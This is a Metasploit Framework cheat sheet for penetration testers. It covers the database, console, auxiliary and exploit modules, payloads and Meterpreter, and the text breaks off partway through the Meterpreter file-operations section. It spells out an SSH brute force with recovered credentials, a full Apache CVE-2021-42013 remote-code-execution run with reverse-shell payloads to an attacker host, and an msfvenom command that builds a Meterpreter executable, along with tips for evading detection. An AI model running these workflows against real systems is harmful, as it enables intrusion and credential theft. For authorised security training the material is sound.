# The Metasploit Framework - Professional Cheat Sheet

## Table of Contents
1. [Core Concepts](#core-concepts)
2. [Database Setup and Management](#database-setup-and-management)
3. [MSF Console Basics](#msf-console-basics)
4. [Auxiliary Modules](#auxiliary-modules)
5. [Exploit Modules](#exploit-modules)
6. [Understanding Payloads](#understanding-payloads)
7. [Meterpreter Deep Dive](#meterpreter-deep-dive)
8. [Generating Executables (msfvenom)](#generating-executables-msfvenom)
9. [Post-Exploitation](#post-exploitation)
10. [Pivoting Techniques](#pivoting-techniques)
11. [Automation with Resource Scripts](#automation-with-resource-scripts)
12. [Quick Reference](#quick-reference)

---

## Core Concepts

### What is Metasploit Framework?
- **Maintainer**: Rapid7
- **Type**: Open-source exploit framework
- **Language**: Ruby
- **Purpose**: Consolidate exploits, automate exploitation, manage compromised infrastructure
- **Package**: `metasploit-framework` (pre-installed on Kali)

### Framework Components
```
┌─────────────────────────────────────┐
│     Metasploit Framework            │
├─────────────────────────────────────┤
│ • Exploits (2200+)                  │
│ • Auxiliary Modules (1187+)         │
│ • Payloads (951+)                   │
│ • Post-Exploitation Modules (399+)  │
│ • Encoders (45+)                    │
│ • NOPs (11+)                        │
│ • Evasion Modules (9+)              │
└─────────────────────────────────────┘
```

### Why Use Metasploit?

**Problems with Manual Exploits:**
- Different coding languages and styles
- No standardization in syntax
- Requires modification for each scenario
- Must test for malicious code
- Difficult to manage multiple shells

**Metasploit Solutions:**
✅ Unified interface for all exploits
✅ Standardized command syntax
✅ Dynamic payload selection per exploit
✅ Automatic session management
✅ Database storage of results
✅ Built-in post-exploitation tools
✅ Integrated pivoting capabilities

---

## Database Setup and Management

### Why Use a Database?

**Critical Benefits:**
- Store information about target hosts
- Track successful exploitations
- Manage credentials discovered
- Record vulnerabilities found
- Separate different assessments (workspaces)
- Query results across modules

### Initial Setup

**Start and Initialize Database:**
```bash
# Create and initialize MSF database
sudo msfdb init

# Output:
# [+] Starting database
# [+] Creating database user 'msf'
# [+] Creating databases 'msf' and 'msf_test'
# [+] Creating configuration file
# [+] Creating initial database schema
```

**Enable at Boot:**
```bash
sudo systemctl enable postgresql
```

**Check Database Status:**
```bash
# From within msfconsole
db_status

# Expected output:
# [*] Connected to msf. Connection type: postgresql.
```

### Workspace Management

**Concept**: Separate data from different engagements

**Commands:**
```bash
# List all workspaces (* = current)
workspace

# Create new workspace
workspace -a client_pentest_2024

# Switch workspace
workspace client_pentest_2024

# Delete workspace
workspace -d old_assessment

# List with details
workspace -v
```

**Best Practice**: Create workspace per client/assessment

### Database Backend Commands

#### Scanning and Storage

**Nmap Integration:**
```bash
# Run Nmap and auto-store results
db_nmap -A 192.168.50.202
db_nmap -sV -p- 192.168.50.0/24

# Identical syntax to regular Nmap
# Results automatically stored in database
```

#### Querying Stored Data

**Hosts:**
```bash
# List all discovered hosts
hosts

# Output columns: address, mac, name, os_name, os_flavor, purpose
# Example:
# 192.168.50.202    Windows 2016    server
```

**Services:**
```bash
# List all services
services

# Filter by port
services -p 445
services -p 80,443

# Filter by host
services 192.168.50.202

# Output: host, port, proto, name, state, info
```

**Vulnerabilities:**
```bash
# List discovered vulnerabilities
vulns

# Output: timestamp, host, name, references
# Auto-populated by certain modules
```

**Credentials:**
```bash
# List all captured credentials
creds

# Output: host, origin, service, public, private, realm, private_type
# Auto-populated after successful auth or dumps
```

**Loot:**
```bash
# List exfiltrated data
loot

# Shows files downloaded, hashes dumped, etc.
```

**Notes:**
```bash
# View/add notes about hosts
notes
notes -a "192.168.50.202" "Domain Controller candidate"
```

#### Using Database Results

**Set Module Options from DB:**
```bash
# Automatically set RHOSTS from services query
services -p 445 --rhosts

# This sets RHOSTS to all hosts with port 445 open
```

### Database Maintenance

**Backup Workspace:**
```bash
workspace -v  # Note workspace name
# Backup PostgreSQL database manually or use pg_dump
```

**Reset Database:**
```bash
sudo msfdb reinit  # Deletes ALL data!
```

---

## MSF Console Basics

### Starting Metasploit
```bash
# Standard start
sudo msfconsole

# Quiet mode (no banner)
sudo msfconsole -q

# Load resource script on start
sudo msfconsole -r script.rc
```

### Command Categories

**Overview:**
```
Core Commands          - Basic navigation and help
Module Commands        - Search, use, show modules
Job Commands           - Background task management
Resource Script Cmds   - Automation scripts
Database Backend Cmds  - Data queries and storage
Credentials Backend    - Credential management
Developer Commands     - Module development
```

### Core Commands
```bash
# Help and information
help                    # Show all commands
help search            # Help for specific command
?                      # Alias for help

# Navigation
back                   # Exit current module
exit                   # Exit msfconsole
quit                   # Alias for exit

# Version info
version                # Show MSF version

# System interaction
!<cmd>                 # Execute system command
! ls -la              # Example: list files
```

### Module Commands

**Search:**
```bash
# Basic search
search apache
search type:exploit smb
search cve:2021

# Advanced search filters
search type:auxiliary name:ssh
search platform:windows type:exploit
search author:metasploit rank:excellent

# Search operators
type:          auxiliary, exploit, post, payload
platform:      windows, linux, unix, osx
name:          search in module name
author:        module author
cve:           CVE identifier
rank:          excellent, great, good, normal, average
```

**Using Modules:**
```bash
# Activate module
use exploit/windows/smb/psexec
use 15                    # Use by search result index

# Show module types
show -h
show all                  # Show all modules
show exploits            # Show exploit modules
show auxiliary           # Show auxiliary modules
show payloads            # Show payload modules
show encoders            # Show encoders

# Module information
info                     # Current module info
info <module>           # Specific module info
```

**Module Options:**
```bash
# View options
show options            # All options
show missing           # Required but unset options
show advanced          # Advanced options
show evasion           # Evasion options
show targets           # Available targets
show payloads          # Compatible payloads

# Set options
set RHOSTS 192.168.50.202
set LHOST 192.168.119.2
set LPORT 443
set PAYLOAD windows/meterpreter/reverse_tcp

# Unset options
unset RHOSTS
unset LHOST

# Global options (persist across modules)
setg LHOST 192.168.119.2
unsetg LHOST
```

### Module Execution
```bash
# Run module
run                     # Execute module
exploit                # Alias for run (exploits only)

# Run as background job
run -j
exploit -j

# Check if target vulnerable
check                   # Some modules support this

# Auto-connect to session
run -z                 # Don't auto-interact with session
```

### Module Hierarchy

**Naming Convention:**
```
module_type/os_vendor_app_protocol/module_name

Examples:
auxiliary/scanner/smb/smb_version
exploit/multi/http/apache_normalize_path_rce
post/windows/manage/migrate
payload/windows/x64/meterpreter/reverse_tcp
```

**Module Types:**
- `auxiliary/` - Scanners, fuzzers, enumeration
- `exploit/` - Exploitation modules
- `post/` - Post-exploitation actions
- `payload/` - Payload code
- `encoder/` - Payload encoding
- `nop/` - NOP generators
- `evasion/` - AV/IDS evasion

---

## Auxiliary Modules

### Purpose
Non-exploitative tasks: scanning, enumeration, fuzzing, sniffing, protocol analysis

### Common Auxiliary Categories
```
auxiliary/
├── scanner/          # Port/service scanning
│   ├── smb/         # SMB enumeration
│   ├── ssh/         # SSH bruteforce/enum
│   ├── http/        # Web scanning
│   └── portscan/    # Port scanners
├── gather/          # Information gathering
├── admin/           # Administrative tasks
└── fuzzers/         # Protocol fuzzing
```

### Example 1: SMB Version Detection

**Goal**: Identify SMB version on target
```bash
# Search for SMB auxiliary modules
search type:auxiliary smb

# Use SMB version scanner (by index)
use 56
# Or by name
use auxiliary/scanner/smb/smb_version

# Show module info
info

# View options
show options
# Required: RHOSTS, THREADS

# Set target
set RHOSTS 192.168.50.202

# Or set from database
services -p 445 --rhosts

# Execute
run
```

**Output:**
```
[*] 192.168.50.202:445 - SMB Detected (versions:2, 3)
[*] 192.168.50.202:445 - (preferred dialect:SMB 3.1.1)
[*] Scanned 1 of 1 hosts (100% complete)
```

**Check Auto-detected Vulnerabilities:**
```bash
vulns

# Example output:
# Host: 192.168.50.202
# Name: SMB Signing Is Not Required
# References: [URLs to patches/info]
```

### Example 2: SSH Brute Force

**Goal**: Dictionary attack against SSH
```bash
# Search SSH auxiliary
search type:auxiliary ssh

# Use SSH login scanner
use auxiliary/scanner/ssh/ssh_login

# View options
show options

# Set options
set USERNAME george
set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS 192.168.50.201
set RPORT 2222
set THREADS 5
set VERBOSE false           # Reduce output
set STOP_ON_SUCCESS true    # Stop after finding valid cred

# Execute
run
```

**Output:**
```
[*] 192.168.50.201:2222 - Starting bruteforce
[+] 192.168.50.201:2222 - Success: 'george:chocolate'
[*] SSH session 1 opened (192.168.119.2:38329 -> 192.168.50.201:2222)
```

**Auto-created Session:**
```bash
# Unlike Hydra, Metasploit creates a session
sessions -l
sessions -i 1
```

**View Credentials:**
```bash
creds

# Output:
# host: 192.168.50.201
# service: 2222/tcp (ssh)
# public: george
# private: chocolate
# private_type: Password
```

### Key Auxiliary Modules

**SMB:**
```bash
auxiliary/scanner/smb/smb_version          # Version detection
auxiliary/scanner/smb/smb_enumshares       # Share enumeration
auxiliary/scanner/smb/smb_enumusers        # User enumeration
auxiliary/scanner/smb/smb_login            # Credential testing
auxiliary/scanner/smb/smb_ms17_010         # EternalBlue detection
```

**SSH:**
```bash
auxiliary/scanner/ssh/ssh_version          # Version detection
auxiliary/scanner/ssh/ssh_login            # Brute force
auxiliary/scanner/ssh/ssh_enumusers        # User enumeration
```

**HTTP:**
```bash
auxiliary/scanner/http/dir_scanner         # Directory bruteforce
auxiliary/scanner/http/http_version        # Server version
auxiliary/scanner/http/wordpress_scanner   # WordPress enum
```

**Port Scanning:**
```bash
auxiliary/scanner/portscan/tcp             # TCP port scan
auxiliary/scanner/portscan/syn             # SYN scan (requires root)
```

### Auxiliary Best Practices

✅ Set THREADS appropriately (default: 1)
✅ Use VERBOSE false for large scans
✅ Set STOP_ON_SUCCESS for brute forcing
✅ Leverage database results (--rhosts)
✅ Check vulns after running scanners

---

## Exploit Modules

### Purpose
Execute code on vulnerable systems, gain access

### Understanding Exploit Info

**Activate and Review Module:**
```bash
use exploit/multi/http/apache_normalize_path_rce
info
```

**Critical Info Fields:**

**1. Platform & Architecture:**
```
Platform: Unix, Linux
Arch: cmd, x64, x86
```
Indicates target OS and CPU architecture

**2. Module Side Effects:**
```
ioc-in-logs          # Leaves log entries
artifacts-on-disk    # Creates files on system
```
Important for stealth considerations

**3. Module Stability:**
```
crash-safe          # Won't crash service
crash-safe-process  # Might crash process
crash              # Will likely crash
service-down       # Takes service offline
```
Risk assessment for production systems

**4. Module Reliability:**
```
repeatable-session  # Can run multiple times
one-shot           # Only works once
```
Can we re-exploit if session dies?

**5. Available Targets:**
```
Id  Name
--  ----
0   Automatic (Dropper)
1   Unix Command (In-Memory)
2   Windows 7/2008
```
Different OS versions or execution methods

**6. Check Supported:**
```
Check supported: Yes
```
Can verify vulnerability before exploiting

### Exploit Module Workflow

**Step 1: Search and Select**
```bash
# Search by name
search Apache 2.4.49
search CVE-2021-42013

# Search by type
search type:exploit apache

# Select module
use 0
# Or
use exploit/multi/http/apache_normalize_path_rce
```

**Step 2: Review Module**
```bash
# Full information
info

# Check requirements
show options
show missing

# View compatible payloads
show payloads

# Check available targets
show targets
```

**Step 3: Configure**
```bash
# Set target options
set RHOSTS 192.168.50.16
set RPORT 80
set SSL false
set TARGETURI /cgi-bin

# Set payload
set payload linux/x64/shell_reverse_tcp

# Set payload options
set LHOST 192.168.119.2
set LPORT 4444
```

**Step 4: Verify (Optional)**
```bash
# Check if vulnerable
check

# Output:
# [+] The target is vulnerable to CVE-2021-42013
```

**Step 5: Exploit**
```bash
# Execute
run

# Or as background job
run -j
```

### Example: Apache Path Traversal RCE

**Full Workflow:**
```bash
# 1. Create workspace
workspace -a apache_exploit

# 2. Search
search Apache 2.4.49

# 3. Select exploit
use exploit/multi/http/apache_normalize_path_rce

# 4. Review
info
show options
show payloads

# 5. Configure
set RHOSTS 192.168.50.16
set RPORT 80
set SSL false
set payload linux/x64/shell_reverse_tcp
set LHOST 192.168.119.2
set LPORT 4444

# 6. Check (optional)
check

# 7. Exploit
run
```

**Successful Output:**
```
[*] Started reverse TCP handler on 192.168.119.2:4444
[+] The target is vulnerable to CVE-2021-42013
[*] Sending linux/x64/shell_reverse_tcp payload
[*] Command shell session 1 opened
[!] May require cleanup of '/tmp/xyz' on target

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### Sessions vs Jobs

**Sessions**: Active connections to compromised hosts
```bash
# List sessions
sessions -l

# Interact with session
sessions -i 2

# Background current session
# Press Ctrl+Z, then confirm

# Kill session
sessions -k 2

# Kill all
sessions -K
```

**Jobs**: Background tasks (listeners, brute forcers)
```bash
# Run as job
run -j
exploit -j

# List jobs
jobs

# Kill job
jobs -k 1
```

**Why This Matters:**
- Manage multiple targets simultaneously
- Don't lose track of access
- Run listeners while working elsewhere
- Organize by workspace

### Exploit Module Locations

**Common Categories:**
```
exploit/
├── windows/          # Windows exploits
│   ├── smb/         # SMB service exploits
│   ├── rdp/         # RDP exploits
│   └── local/       # Local privilege escalation
├── linux/           # Linux exploits
│   ├── http/        # Web application exploits
│   └── local/       # Local privilege escalation
├── multi/           # Cross-platform
│   ├── http/        # Web exploits
│   └── handler/     # Generic handlers
└── unix/            # Unix-like systems
```

### Important Exploit Considerations

⚠️ **Side Effects**: Check for artifacts/logs
⚠️ **Stability**: Avoid crashing production systems
⚠️ **Reliability**: Can it be run multiple times?
⚠️ **Cleanup**: May leave files to remove
⚠️ **Permissions**: What privileges do we get?

✅ **Always**:
- Read module info thoroughly
- Understand what it does
- Check if it's appropriate for assessment
- Verify target match
- Have cleanup plan

---

## Understanding Payloads

### Payload Fundamentals

**Definition**: Code executed after successful exploitation

**Purpose**: 
- Open shell access
- Install backdoor
- Execute commands
- Download/upload files
- Establish persistent access

### Staged vs Non-Staged

**Critical Distinction**: How payload is delivered

#### Non-Staged Payloads

**Syntax**: Single `_` (underscore)
```
windows/x64/shell_reverse_tcp
linux/x64/meterpreter_reverse_tcp
```

**Characteristics:**
- All-in-one payload
- Sent entirely with exploit
- Larger size
- More stable
- Self-contained

**When to Use:**
- Reliable network
- No size constraints
- Stability critical
- Target may die before stage 2

**Example:**
```bash
set payload linux/x64/shell_reverse_tcp
# Size: ~460 bytes
```

#### Staged Payloads

**Syntax**: Contains `/` (slash) in payload portion
```
windows/x64/shell/reverse_tcp
linux/x64/meterpreter/reverse_tcp
```

**Characteristics:**
- Two-part delivery
- Stage 1: Small connector (~38 bytes)
- Stage 2: Main payload (sent after connection)
- Smaller initial size
- Requires stable connection

**How It Works:**
```
1. Exploit sends Stage 1 (small)
2. Target connects back
3. Attacker sends Stage 2 (large)
4. Stage 2 executes in memory
```

**When to Use:**
- Buffer overflow (space constraints)
- Evade detection (smaller initial footprint)
- Restricted upload size
- Target with limited memory

**Example:**
```bash
set payload linux/x64/shell/reverse_tcp
# Stage 1: 38 bytes
# Stage 2: ~336 bytes (sent after connection)
```

### Staged Payloads in Action
```bash
use exploit/multi/http/apache_normalize_path_rce
show payloads

# Find staged vs non-staged
15  payload/linux/x64/shell/reverse_tcp    # Staged (/)
20  payload/linux/x64/shell_reverse_tcp    # Non-staged (_)

# Use staged
set payload 15

# Run
run
```

**Output Difference:**
```
[*] Sending stage (38 bytes) to 192.168.50.16   # <- Staged indicator
[*] Command shell session 3 opened
```

### Payload Architecture

**Common Platforms:**
```
windows/          # Windows systems
linux/            # Linux systems
osx/              # macOS
android/          # Android devices
python/           # Python-based
php/              # PHP (webshells)
java/             # Java-based
```

**Common Architectures:**
```
x86               # 32-bit Intel/AMD
x64               # 64-bit Intel/AMD
mips              # MIPS processors
armle             # ARM Little Endian
```

**Example:**
```
windows/x64/shell_reverse_tcp
  ↓      ↓    ↓
  │      │    └─ Payload type
  │      └────── Architecture
  └───────────── Platform
```

### Payload Types

#### Shell Payloads

**Basic command shells:**
```bash
# Linux
linux/x64/shell_reverse_tcp          # Non-staged
linux/x64/shell/reverse_tcp         # Staged

# Windows
windows/x64/shell_reverse_tcp        # Non-staged
windows/x64/shell/reverse_tcp       # Staged
```

**Features:**
- Basic command execution
- Simple and reliable
- Limited functionality
- No encryption
- Small size

#### Meterpreter Payloads

**Advanced multi-function payloads:**
```bash
# Linux
linux/x64/meterpreter_reverse_tcp    # Non-staged
linux/x64/meterpreter/reverse_tcp   # Staged

# Windows
windows/x64/meterpreter_reverse_tcp  # Non-staged
windows/x64/meterpreter/reverse_tcp # Staged
```

**Features:**
- Rich command set
- File operations
- Process migration
- Port forwarding
- Credential dumping
- Encrypted communication

**Note**: All Meterpreter payloads are technically staged, but:
- `meterpreter_reverse_tcp` = All-in-one (larger)
- `meterpreter/reverse_tcp` = Two-stage (smaller initial)

### Connection Types

#### Reverse Payloads
**Target connects TO attacker**
```bash
# Syntax
*_reverse_tcp
*_reverse_https

# Example
windows/x64/shell_reverse_tcp

# Usage
set LHOST 192.168.119.2    # Attacker IP
set LPORT 4444              # Attacker port
```

**Advantages:**
✅ Bypasses inbound firewall rules
✅ Works behind NAT
✅ Most common in pentesting

#### Bind Payloads
**Attacker connects TO target**
```bash
# Syntax
*_bind_tcp

# Example
windows/x64/shell_bind_tcp

# Usage
set RHOST 192.168.50.202   # Target IP
set LPORT 4444              # Port on target
```

**When to Use:**
- Pivoting scenarios (target can't reach attacker)
- Attacker behind restrictive firewall
- Required by some exploit modules

**Disadvantages:**
⚠️ Blocked by inbound firewall
⚠️ Requires port open on target
⚠️ More detectable

### Protocol Variations

#### TCP (Standard)
```bash
*_reverse_tcp
*_bind_tcp
```
- Raw TCP connection
- Fast and reliable
- Unencrypted
- Easy to detect

#### HTTPS (Encrypted)
```bash
*_reverse_https
windows/x64/meterpreter_reverse_https
```
- SSL/TLS encrypted
- Harder to detect
- Appears as normal HTTPS
- Slight overhead

**Advantages:**
✅ Encrypted communication
✅ Blends with normal traffic
✅ Harder for IDS/IPS to detect
✅ Can use LURI for separation

#### HTTP (Less Common)
```bash
*_reverse_http
```
- Unencrypted HTTP
- Easy to inspect
- Less stealthy than HTTPS

### Payload Options

**Common Options:**
```bash
# Reverse payloads
set LHOST 192.168.119.2    # Listener IP (attacker)
set LPORT 443               # Listener port

# Bind payloads  
set RHOST 192.168.50.202   # Target IP
set LPORT 4444              # Port on target

# HTTPS payloads
set LURI /custom_path       # Custom URI path (optional)

# Advanced
set EXITFUNC thread         # How payload exits
set AutoRunScript post/...  # Auto-run after session
```

### Payload Selection Decision Tree
```
Space constraints? 
  └─ YES → Staged payload
  └─ NO  → Consider other factors
       │
       ├─ Need stability?
       │   └─ YES → Non-staged
       │
       ├─ Need stealth?
       │   └─ YES → Staged + HTTPS
       │
       └─ Need features?
           └─ YES → Meterpreter
```

### Payload Compatibility

**Check Compatible Payloads:**
```bash
use exploit/...
show payloads

# Shows only payloads that work with this exploit
```

**Why Some Don't Work:**
- Platform mismatch (Windows exploit, Linux payload)
- Architecture mismatch (x86 exploit, x64 payload)
- Protocol incompatibility
- Size constraints

### Listener Setup

**For Non-Staged Payloads:**
```bash
# Netcat works
nc -nvlp 4444

# Or use multi/handler
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 192.168.119.2
set LPORT 4444
run
```

**For Staged Payloads:**
```bash
# MUST use multi/handler
use exploit/multi/handler
set payload windows/x64/shell/reverse_tcp  # Note the /
set LHOST 192.168.119.2
set LPORT 4444
run
```

**For Meterpreter:**
```bash
# MUST use multi/handler
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 192.168.119.2
set LPORT 443
run
```

### Payload Best Practices

**Port Selection:**
```
4444  # MSF default (often blocked!) ⚠️
443   # HTTPS (recommended) ✅
80    # HTTP (recommended) ✅
53    # DNS (sometimes works) ✅
8080  # Alt-HTTP (common) ✅
8443  # Alt-HTTPS (common) ✅
```

**Recommendations:**
✅ Use HTTPS payloads when possible
✅ Avoid port 4444 (MSF default, widely blocked)
✅ Use common ports (80, 443)
✅ Match payload arch to target
✅ Start with non-staged for stability
✅ Switch to staged if size matters

---

## Meterpreter Deep Dive

### What is Meterpreter?

**Metasploit's Signature Payload**

**Characteristics:**
- Multi-function advanced payload
- Resides entirely in memory (no disk writes)
- Encrypted by default (HTTPS variants)
- Dynamically extensible at runtime
- Cross-platform (Windows, Linux, macOS, Android)

**Why Meterpreter?**
- Rich post-exploitation features
- Built-in pivoting
- File transfer capabilities
- Process management
- Credential dumping
- Network manipulation

### Meterpreter Payload Types
```bash
# Linux
linux/x64/meterpreter_reverse_tcp     # Non-staged TCP
linux/x64/meterpreter/reverse_tcp    # Staged TCP
linux/x64/meterpreter_reverse_https  # Non-staged HTTPS

# Windows
windows/x64/meterpreter_reverse_tcp       # Non-staged TCP
windows/x64/meterpreter/reverse_tcp      # Staged TCP
windows/x64/meterpreter_reverse_https    # Non-staged HTTPS
windows/x64/meterpreter_reverse_http     # Non-staged HTTP
```

**Recommendation**: Use non-staged HTTPS for:
- Less network traffic (no stage 2 download)
- Encrypted communication
- Harder to detect

### Getting Meterpreter Session

**Method 1: Via Exploit Module**
```bash
use exploit/multi/http/apache_normalize_path_rce
set payload linux/x64/meterpreter_reverse_tcp
set LHOST 192.168.119.2
set LPORT 4444
set RHOSTS 192.168.50.16
run
```

**Method 2: Via Executable**
```bash
# Generate executable
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=192.168.119.4 LPORT=443 \
  -f exe -o met.exe

# Set up handler
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
run

# Execute met.exe on target
```

### Core Meterpreter Commands

**Help and Info:**
```bash
help                    # Show all commands
?                       # Alias for help
info                    # Session info
background              # Background session
bg                      # Alias for background
quit                    # Exit session
exit                    # Alias for quit
```

**Session Management:**
```bash
sessions                # List all sessions (from handler)
sessions -i 1           # Interact with session 1
background              # Send to background (Ctrl+Z also works)
```

### System Commands
```bash
# System information
sysinfo                 # OS, architecture, etc.
getuid                  # Current user
getpid                  # Current process ID

# User activity
idletime                # How long user idle
```

**Example:**
```bash
meterpreter > sysinfo
Computer     : CLIENTWK220
OS           : Windows 10 (10.0 Build 19044)
Architecture : x64
System Language : en_US
Meterpreter  : x64/windows

meterpreter > getuid
Server username: CLIENTWK220\user

meterpreter > idletime
User has been idle for: 9 mins 53 secs
```

### Process Management

**List Processes:**
```bash
ps                      # Show all processes

# Output: PID, PPID, Name, Arch, Session, User, Path
```

**Execute Programs:**
```bash
execute -f notepad.exe          # Execute program
execute -H -f notepad.exe       # Execute hidden
execute -f cmd.exe -i           # Interactive
execute -f cmd.exe -H -i        # Hidden interactive
```

**Kill Processes:**
```bash
kill 1234               # Kill PID 1234
```

### File System Navigation

**Basic Navigation:**
```bash
pwd                     # Print working directory
getwd                   # Alias for pwd
cd C:\\Windows\\Temp    # Change directory (escape backslashes!)
ls                      # List files
ls -la                  # Detailed listing
dir                     # Alias for ls
```

**File Operations:**
```bash
cat file.txt            #
